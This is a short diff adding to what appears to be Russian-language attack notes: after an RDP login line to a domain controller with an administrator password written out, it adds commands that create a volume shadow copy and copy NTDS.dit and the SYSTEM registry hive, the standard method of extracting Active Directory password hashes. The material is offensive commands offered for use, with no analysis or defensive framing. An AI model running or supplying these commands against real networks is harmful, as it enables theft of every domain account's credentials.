@@ -9,7 +9,12 @@ xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Admin123
 
 
 
+Создание теневой копии диска
 
+vssadmin create shadow /for=c:
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
 
 
 
